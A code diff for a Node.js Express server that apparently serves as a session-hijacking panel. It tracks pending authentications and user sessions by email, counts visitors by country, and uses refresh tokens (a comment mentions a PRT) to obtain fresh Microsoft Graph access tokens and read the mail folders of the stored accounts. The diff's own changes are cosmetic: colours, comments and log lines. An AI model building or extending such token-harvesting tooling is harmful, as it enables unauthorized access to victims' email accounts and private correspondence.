@@ -21,7 +21,21 @@ let userSessions = new Map();
 let pendingAuth = new Map();
 let sessionCounter = 1;
 
-// IP to Country mapping (simplified - you can use a real geolocation API)
+// Country colors for stats
+const countryColors = {
+    'United States': '#B22234',
+    'Canada': '#FF0000',
+    'United Kingdom': '#00247D',
+    'Germany': '#FFCC00',
+    'France': '#0055A4',
+    'Japan': '#BC002D',
+    'Australia': '#012169',
+    'India': '#FF9933',
+    'Netherlands': '#FF7900',
+    'Sweden': '#005B99',
+    'Other': '#6B8E23'
+};
+
 function getCountryFromIp(ip) {
     const countryMap = {
         '46.183': 'United States',
@@ -231,7 +245,6 @@ app.get('/api/session/token/:email', async (req, res) => {
     
     if (!session) return res.status(404).json({ error: 'Session not found' });
     
-    // Get fresh access token
     const freshToken = await getFreshAccessToken(email);
     
     res.json({
@@ -305,12 +318,12 @@ app.delete('/api/sessions/clear', (req, res) => {
 });
 
 // ============================================
-// MAILBOX API
+// MAILBOX API - Uses PRT to get fresh token
 // ============================================
 app.get('/api/mail/folders/:email', async (req, res) => {
     const { email } = req.params;
     const token = await getFreshAccessToken(email);
-    if (!token) return res.status(401).json({ error: 'No valid token' });
+    if (!token) return res.status(401).json({ error: 'No valid token. Please re-authenticate.' });
     
     try {
         const response = await axios.get('https://graph.microsoft.com/v1.0/me/mailFolders', {
@@ -427,7 +440,13 @@ app.get('/api/resource/settings', (req, res) => res.json({ success: true, active
 app.post('/api/resource/settings', (req, res) => { config.active_resource = req.body.active_resource; res.json({ success: true }); });
 app.post('/api/openai/settings', (req, res) => { Object.assign(config, req.body); res.json({ success: true }); });
 
+// ============================================
+// SERVE FILES
+// ============================================
 app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'public', 'index.html')));
 app.listen(PORT, '0.0.0.0', () => {
+    console.log(`\n========================================`);
     console.log(`✅ Server running on port ${PORT}`);
+    console.log(`✅ Resource: ${config.active_resource}`);
+    console.log(`========================================\n`);
 });
